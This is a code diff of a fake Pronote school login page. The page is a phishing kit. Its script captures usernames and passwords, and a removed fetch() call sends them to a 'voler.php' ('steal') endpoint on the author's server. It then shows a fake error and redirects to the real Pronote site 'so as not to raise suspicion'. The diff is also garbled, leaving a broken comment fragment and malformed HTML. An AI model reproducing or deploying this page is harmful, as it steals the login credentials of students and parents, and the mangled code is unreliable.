@@ -1,24 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Connexion Pronote - Sécurité</title>
-    <style>
-        body {
-            background: #f0f2f5;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-box {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 300px;
-            text-align: center;
-        }
+
         input {
             width: 100%;
             padding: 10px;
@@ -36,16 +16,7 @@
             e.preventDefault();
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-            
-            // Envoie les données vers ton serveur (PHP)
-            fetch('https://ton-site.com/voler.php', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'user=' + encodeURIComponent(user) + '&pass=' + encodeURIComponent(pass)
-            });
-            
-            document.getElementById('msg').innerText = 'Identifiant ou mot de passe incorrect. Réessayez.';
-            // Redirige vers le vrai Pronote pour ne pas éveiller les soupçons
+         note pour ne pas éveiller les soupçons
             setTimeout(() => {
                 window.location = 'https://www.index-education.net/fr/pronote';
             }, 1500);
